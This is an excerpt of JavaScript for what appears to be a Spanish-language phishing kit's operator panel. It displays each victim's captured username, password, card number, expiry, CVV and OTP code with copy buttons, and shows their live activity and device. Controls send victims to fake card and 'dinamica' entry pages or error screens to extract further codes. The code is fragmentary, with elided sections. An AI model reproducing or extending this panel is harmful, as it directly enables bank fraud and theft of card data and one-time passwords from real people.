...
function detectStateChanges(docs) {
    ...
    docs.forEach(doc => {
        ...
        if (userStates.has(userId)) {
            ...
            const previousOtp = previousState.otpCode || '';
            ...
            if (stateChanged) {
                updatedUsers.push({
                    ...
                    newState: {
                        ...
                        otpCode: currentOtp || previousOtp || ''
                    }
                });
            }
        ...
        docs.forEach((doc) => {
            ...
            if (isActive && lastActivity) {
              ...
              if (timeSinceActivity < 30000) { // Menos de 30 segundos
                ...
                activityBadgeIcon = '🟢';
                activityBadgeText = `Activo (${pageLocation})`;
              } else if (timeSinceActivity < 120000) { // Entre 30s y 2min
                activityStatus = 'inactivo';
                activityBadgeColor = '#ffc107'; // Amarillo
                activityBadgeIcon = '🟡';
                activityBadgeText = `Inactivo (${Math.floor(timeSinceActivity / 1000)}s)`;
              }
            }

            const cardInnerHTML = `
            <div class="card user-card highlight-animation" style="background-color:rgb(107, 107, 107); color: #ffffff;">
              <div class="card-header d-flex justify-content-between align-items-center"; border-bottom: 1px solid #ccc; color: ${textColor};">
                <h5>
                  <span class="badge badge-dark" style="margin-right: 10px;">#${cardNumber}</span>
                  <span class="badge" style="background-color: ${activityBadgeColor}; color: white; margin-right: 10px; font-size: 11px;" title="Estado de actividad del usuario">${activityBadgeIcon} ${activityBadgeText}</span>
                </h5>
                <span class="badge badge-${statusClass}" style="min-width: 108px; text-align: center; font-size: 12px; padding: 8px 12px;">${statusText}</span>
              </div>
              <div style="margin: 20px 0px 0px 20px; color: ${textColor};">
                <p class="mb-0" style="color: ${textColor};">Usuario: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${usuario}" title="Haz clic para copiar">${usuario} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">Clave: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${clave}" title="Haz clic para copiar">${clave} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">TDC Nombre: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${tdcNombre}" title="Haz clic para copiar">${tdcNombre} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">Numero: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${tdcNumero}" title="Haz clic para copiar">${tdcNumero} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">Mes: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${tdcMes}" title="Haz clic para copiar">${tdcMes} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">Año: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${tdcAnio}" title="Haz clic para copiar">${tdcAnio} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">CVV: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${tdcCvv}" title="Haz clic para copiar">${tdcCvv} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
                <p class="mb-0" style="color: ${textColor};">OTP: <span class="copyable" style="cursor: pointer; color: ${textColor};" data-value="${otpCode}" title="Haz clic para copiar">${otpCode} <img src="http://clipground.com/images/copy-4.png" style="width: 15px; height: 15px;"></span></p>
              </div>
              <div class="card-body">
                <div class="btn-group btn-block">
                  <button class="btn btn-success action-btn mr-1 rounded" data-action="home" data-id="${userId}">Inicio</button>
                  <button class="btn btn-primary action-btn mr-1 rounded" data-action="tdc" data-id="${userId}">TDC</button>
                  <button class="btn btn-warning action-btn mr-1 rounded" data-action="tdc_err" data-id="${userId}">TDC Error</button>
                  
                </div>
                <div class="btn-group btn-block">
                <button class="btn btn-primary action-btn mr-1 rounded" data-action="dinamica" data-id="${userId}">Dinamica</button>
                  <button class="btn btn-warning action-btn mr-1 rounded" data-action="dinamica_err" data-id="${userId}">Dinamica Error</button>
                  <button class="btn btn-success action-btn mr-1 rounded" data-action="fuera" data-id="${userId}">Fuera</button>
                  <button class="btn btn-danger action-btn mr-1 rounded" data-action="remove" data-id="${userId}">Eliminar</button>
                </div>
              </div>
              <div class="text-center py-1" style="background-color: ${dispositivoBadgeColor}; display: flex; align-items: center; justify-content: center;">
                    <p style="font-size: 16px; font-weight: bold; color: black; margin: 0px;" title="Dispositivo detectado">${dispositivo}</p>
                </div>
            </div>
            `;
            ...
            userCardContainer.className = "col-md-6 mb-3";
